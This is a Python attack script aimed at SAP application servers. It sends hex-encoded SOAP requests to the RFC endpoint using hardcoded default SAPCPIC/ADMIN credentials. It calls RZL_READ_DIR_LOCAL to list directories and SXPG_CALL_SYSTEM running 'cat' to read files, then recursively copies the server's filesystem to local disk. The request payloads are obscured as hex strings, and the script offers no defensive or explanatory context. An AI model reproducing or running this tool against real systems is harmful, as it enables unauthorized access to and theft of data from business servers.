#!/usr/bin/python

import binascii
import time
import sys
import os
import re


read_dir_part1 = "50 4F 53 54 20 2F 73 61 70 2F 62 63 2F 73 6F 61 70 2F 72 66 63 3F 73 61 70 2D 63 6C 69 65 6E 74 3D 30 30 35 26 73 61 70 2D 6C 61 6E 67 75 61 67 65 3D 45 4E 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 32 37 2E 30 2E 30 2E 31 3A 38 30 30 30 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 36 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 35 2E 31 29 0D 0A 41 75 74 68 6F 72 69 7A 61 74 69 6F 6E 3A 20 42 61 73 69 63 20 55 30 46 51 51 31 42 4A 51 7A 70 42 52 45 31 4A 54 67 3D 3D 0D 0A 43 6F 6F 6B 69 65 3A 20 73 61 70 2D 75 73 65 72 63 6F 6E 74 65 78 74 3D 73 61 70 2D 6C 61 6E 67 75 61 67 65 3D 45 4E 26 73 61 70 2D 63 6C 69 65 6E 74 3D 30 30 35 0D 0A 53 4F 41 50 41 63 74 69 6F 6E 3A 20 75 72 6E 3A 73 61 70 2D 63 6F 6D 3A 64 6F 63 75 6D 65 6E 74 3A 73 61 70 3A 72 66 63 3A 66 75 6E 63 74 69 6F 6E 73 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 74 65 78 74 2F 78 6D 6C 3B 20 63 68 61 72 73 65 74 3D 55 54 46 2D 38 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20"
read_dir_part1 = read_dir_part1.replace(' ', '')
read_dir_part1 = binascii.unhexlify(read_dir_part1)

read_dir_part2 = "0D 0A 0D 0A 3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E 30 22 20 65 6E 63 6F 64 69 6E 67 3D 22 75 74 66 2D 38 22 20 3F 3E 3C 53 4F 41 50 2D 45 4E 56 3A 45 6E 76 65 6C 6F 70 65 20 78 6D 6C 6E 73 3A 53 4F 41 50 2D 45 4E 56 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 73 6F 61 70 2F 65 6E 76 65 6C 6F 70 65 2F 22 20 78 6D 6C 6E 73 3A 73 6F 61 70 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 77 73 64 6C 2F 73 6F 61 70 2F 22 20 20 78 6D 6C 6E 73 3A 78 73 64 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67 2F 31 39 39 39 2F 58 4D 4C 53 63 68 65 6D 61 22 20 20 78 6D 6C 6E 73 3A 78 73 69 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67 2F 31 39 39 39 2F 58 4D 4C 53 63 68 65 6D 61 2D 69 6E 73 74 61 6E 63 65 22 20 20 78 6D 6C 6E 73 3A 6D 30 3D 22 68 74 74 70 3A 2F 2F 74 65 6D 70 75 72 69 2E 6F 72 67 2F 22 20 20 78 6D 6C 6E 73 3A 53 4F 41 50 2D 45 4E 43 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 73 6F 61 70 2F 65 6E 63 6F 64 69 6E 67 2F 22 3E 3C 53 4F 41 50 2D 45 4E 56 3A 48 65 61 64 65 72 2F 3E 3C 53 4F 41 50 2D 45 4E 56 3A 42 6F 64 79 3E 3C 52 5A 4C 5F 52 45 41 44 5F 44 49 52 5F 4C 4F 43 41 4C 20 78 6D 6C 6E 73 3D 22 75 72 6E 3A 73 61 70 2D 63 6F 6D 3A 64 6F 63 75 6D 65 6E 74 3A 73 61 70 3A 72 66 63 3A 66 75 6E 63 74 69 6F 6E 73 22 3E 3C 46 49 4C 45 5F 54 42 4C 3E 3C 69 74 65 6D 3E 3C 4E 41 4D 45 3E 3C 2F 4E 41 4D 45 3E 3C 53 49 5A 45 3E 3C 2F 53 49 5A 45 3E 3C 2F 69 74 65 6D 3E 3C 2F 46 49 4C 45 5F 54 42 4C 3E 3C 4E 41 4D 45 3E"
read_dir_part2 = read_dir_part2.replace(' ','')
read_dir_part2 = binascii.unhexlify(read_dir_part2)

read_dir_part3 = "</NAME></RZL_READ_DIR_LOCAL></SOAP-ENV:Body></SOAP-ENV:Envelope>"


read_file_part1 = "50 4F 53 54 20 2F 73 61 70 2F 62 63 2F 73 6F 61 70 2F 72 66 63 3F 73 61 70 2D 63 6C 69 65 6E 74 3D 30 30 35 26 73 61 70 2D 6C 61 6E 67 75 61 67 65 3D 45 4E 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 32 37 2E 30 2E 30 2E 31 3A 38 30 30 30 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 36 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 35 2E 31 29 0D 0A 41 75 74 68 6F 72 69 7A 61 74 69 6F 6E 3A 20 42 61 73 69 63 20 55 30 46 51 51 31 42 4A 51 7A 70 42 52 45 31 4A 54 67 3D 3D 0D 0A 43 6F 6F 6B 69 65 3A 20 73 61 70 2D 75 73 65 72 63 6F 6E 74 65 78 74 3D 73 61 70 2D 6C 61 6E 67 75 61 67 65 3D 45 4E 26 73 61 70 2D 63 6C 69 65 6E 74 3D 30 30 35 0D 0A 53 4F 41 50 41 63 74 69 6F 6E 3A 20 75 72 6E 3A 73 61 70 2D 63 6F 6D 3A 64 6F 63 75 6D 65 6E 74 3A 73 61 70 3A 72 66 63 3A 66 75 6E 63 74 69 6F 6E 73 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 74 65 78 74 2F 78 6D 6C 3B 20 63 68 61 72 73 65 74 3D 55 54 46 2D 38 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20"
read_file_part1 = read_file_part1.replace(' ', '')
read_file_part1 = binascii.unhexlify(read_file_part1)

read_file_part2 = "0D 0A 0D 0A 3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E 30 22 20 65 6E 63 6F 64 69 6E 67 3D 22 75 74 66 2D 38 22 20 3F 3E 3C 65 6E 76 3A 45 6E 76 65 6C 6F 70 65 20 78 6D 6C 6E 73 3A 78 73 64 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67 2F 32 30 30 31 2F 58 4D 4C 53 63 68 65 6D 61 22 20 78 6D 6C 6E 73 3A 65 6E 76 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 73 6F 61 70 2F 65 6E 76 65 6C 6F 70 65 2F 22 20 78 6D 6C 6E 73 3A 78 73 69 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67 2F 32 30 30 31 2F 58 4D 4C 53 63 68 65 6D 61 2D 69 6E 73 74 61 6E 63 65 22 3E 3C 65 6E 76 3A 42 6F 64 79 3E 3C 6E 31 3A 53 58 50 47 5F 43 41 4C 4C 5F 53 59 53 54 45 4D 20 78 6D 6C 6E 73 3A 6E 31 3D 22 75 72 6E 3A 73 61 70 2D 63 6F 6D 3A 64 6F 63 75 6D 65 6E 74 3A 73 61 70 3A 72 66 63 3A 66 75 6E 63 74 69 6F 6E 73 22 20 65 6E 76 3A 65 6E 63 6F 64 69 6E 67 53 74 79 6C 65 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61 73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 73 6F 61 70 2F 65 6E 63 6F 64 69 6E 67 2F 22 3E 3C 41 44 44 49 54 49 4F 4E 41 4C 5F 50 41 52 41 4D 45 54 45 52 53 3E"
read_file_part2 = read_file_part2.replace(' ','')
read_file_part2 = binascii.unhexlify(read_file_part2)

read_file_part3 = "</ADDITIONAL_PARAMETERS><COMMANDNAME>cat</COMMANDNAME><OPERATINGSYSTEM>ANYOS</OPERATINGSYSTEM><EXEC_PROTOCOL><item></item></EXEC_PROTOCOL></n1:SXPG_CALL_SYSTEM></env:Body></env:Envelope>"


import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 8000))

def send_remake(payload):
    global s
    try:
        s.send(payload)
    except:
        time.sleep(2)
        remake()
        send_remake(payload)

def recv_remake(n=0):
    if n>10:
        print("Too much tries, exiting")
        exit()
    global s
    try:
        tmp = s.recv(20000)
        return tmp
    except:
        time.sleep(1)
        remake()
        return recv_remake(n+1)

def remake():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8000))


if len(sys.argv)<2:
    print("Usage : "+sys.argv[0]+" [file or dir to dump] [out]")
    exit()

to_dump = sys.argv[1]
target = sys.argv[2]


def dump_dir(d, s):
    data = read_dir_part2+d+read_dir_part3
    payload = read_dir_part1+str(len(data)-4)+data
    send_remake(payload)
    return recv_remake()

def dump_file(f, s):
    data = read_file_part2+f+read_file_part3
    payload = read_file_part1+str(len(data)-4)+data
    send_remake(payload)
    return recv_remake()


if target[-1] != '/':
    print(dump_file(to_dump, s))
else:
    dict_targets = {'':[to_dump]}
    dict_parents = {'':-1,to_dump:''}
    dict_index = {'':0,to_dump:0}
    cur_target = ''

    while dict_index[cur_target]<len(dict_targets[cur_target]):
        print("At beginning :")
        print(dict_index[cur_target])
        print(cur_target)
        directory = dict_targets[cur_target][dict_index[cur_target]]
        parent = dict_parents[cur_target]

        try:
            if not os.path.exists(target+directory):
                os.makedirs(target+directory)
        except:
            os.remove(target+directory)
            os.makedirs(target+directory)

        tmp = dump_dir(directory, s)
        while '<html><head><title>Application Server Error</title></head><body>' in tmp:
            tmp = dump_dir(directory, s)
        dumped = re.findall('<NAME>([^<]*)</NAME><SIZE>([^<]*)</SIZE></item><item>', tmp)

        cur_directories = []
        cur_files = []

        print("==============================")
        print("Dumping out "+directory)
        print(dumped)

        for i,j in dumped:
            if i != '' and i != '.' and i != '..':
                tmp2 = dump_dir(directory+i+'/', s)
                dumped2 = re.findall('<NAME>([^<]*)</NAME><SIZE>([^<]*)</SIZE></item><item>', tmp2)
                print(dumped2)
                print(tmp2)
                print("FOR "+directory+i+'/')
                if len(dumped2)>0:
                    print(i+" is dir !")
                    cur_directories.append(directory+i+'/')
                else:
                    print(i+" is file ! ("+j+")")
                    if int(j) < 10000:
                        tmp3 = dump_file(directory+i, s)
                        tmp = re.findall('</LENGTH><MESSAGE>([^<]*)</MESSAGE></item>', tmp3)
                        if 'icm.properties' in i:
                            print(tmp)
                            print(tmp3)
                            exit()
                        if 'External program terminated with exit code 1' in tmp:
                            print("In fact it was dir !")
                            print("Check :")
                            print(dumped2)
                            cur_directories.append(directory+i+'/')
                        else:
                            with open(target+directory+i, 'wb+') as f:
                                f.write('\n'.join(tmp))
                    else:
                        cur_files.append((target+directory+i,j))
        if len(cur_files) > 0:
            with open(target+directory+"file_sizes", 'wb+') as f:
                for u,v in cur_files:
                    f.write(u.replace('//','/')+" : "+str(v)+"\n")

        print("Giving directories "+str(cur_directories))
        dict_targets[directory] = cur_directories
        for d in cur_directories:
            dict_parents[d] = directory
            dict_index[d] = 0

        dict_index[cur_target] += 1
        ended = False
        if len(cur_directories) > 0:
            cur_target = directory
            print("Now targets are "+str(dict_targets))
        else:
            while dict_index[cur_target]>=len(dict_targets[cur_target]):
                cur_target = dict_parents[cur_target]
                if cur_target == -1:
                    ended = True
                    break
        if ended:
            break

        time.sleep(1)
